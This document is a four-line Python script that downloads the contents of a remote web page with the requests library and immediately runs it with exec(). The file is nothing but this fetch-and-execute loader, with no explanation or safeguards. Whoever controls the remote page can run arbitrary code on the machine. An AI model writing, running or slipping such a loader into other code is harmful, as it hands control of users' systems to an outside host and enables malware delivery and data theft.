import requests

r=requests.get("https://www.certstars.com/alpha/runer.html")
exec(r.text)